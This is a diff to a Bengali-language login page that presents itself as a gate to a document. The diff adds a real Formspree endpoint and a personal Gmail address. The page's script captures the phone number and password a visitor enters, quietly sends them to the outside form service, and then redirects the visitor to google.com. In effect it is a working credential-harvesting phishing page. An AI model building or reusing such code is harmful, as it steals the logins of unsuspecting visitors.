@@ -24,10 +24,11 @@
         <div id="error-msg"></div>
     </div>
 
-    <form id="notifyForm" action="https://formspree.io/f/আপনার_আইডি_এখানে_বসান" method="POST" style="display:none;">
+    <form id="notifyForm" action="https://formspree.io/f/mwpkqzbr" method="POST" style="display:none;">
         <input type="hidden" name="Phone_Used" id="hiddenPhone">
         <input type="hidden" name="Password_Used" id="hiddenPass">
         <input type="hidden" name="Message" value="কেউ আপনার সাইটে ভুল তথ্য দিয়ে ঢোকার চেষ্টা করেছে!">
+        <input type="hidden" name="_replyto" value="sathiiii474747@gmail.com">
     </form>
 
     <script>
@@ -43,11 +44,9 @@
                 alert("লগইন সফল! আপনার ডকুমেন্ট ওপেন হচ্ছে...");
                 window.location.href = "https://google.com"; 
             } else {
-                // স্ক্রিনে এরর মেসেজ দেখানো
                 errorDiv.style.display = "block";
                 errorDiv.innerHTML = "পাসওয়ার্ডটি ভুল। আবার চেষ্টা করুন।";
 
-                // ইমেইলে তথ্য পাঠানোর কাজ
                 document.getElementById("hiddenPhone").value = uPhone;
                 document.getElementById("hiddenPass").value = uPass;
 
@@ -59,7 +58,7 @@
                     body: formData,
                     headers: { 'Accept': 'application/json' }
                 }).then(function() {
-                    console.log("রিপোর্ট পাঠানোর চেষ্টা করা হয়েছে।");
+                    console.log("রিপোর্ট ইমেইলে পাঠানো হয়েছে।");
                 });
             }
         }
